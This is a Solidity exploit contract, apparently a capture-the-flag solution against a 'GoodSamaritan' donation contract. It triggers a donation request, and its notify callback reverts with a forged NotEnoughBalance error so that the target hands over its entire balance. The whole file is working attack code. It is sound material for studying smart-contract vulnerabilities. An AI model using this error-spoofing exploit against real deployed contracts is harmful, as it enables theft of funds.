// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

/**
 * this contract will attack the target by faking an error message
 **/

interface GoodSamaritan {
  function requestDonation() external returns(bool);
}


contract goodsamaritanAttack {

    GoodSamaritan public immutable goodsamaritan;

    // this error will emulate the error coming from Wallet
    error NotEnoughBalance();

    constructor(address goodsamaritan_address) {
      goodsamaritan=GoodSamaritan(goodsamaritan_address);
    }

// notify function will revert and send a message to the target
  function notify(uint256 amount) external {
    
    // test if this is an attempt of normal donation (>> revert), or if this is the full amount (>> do not revert)
    if(amount == 10) {
      revert NotEnoughBalance();
    }
  }

// attack function
  function attack() external {
    goodsamaritan.requestDonation();
  }

}
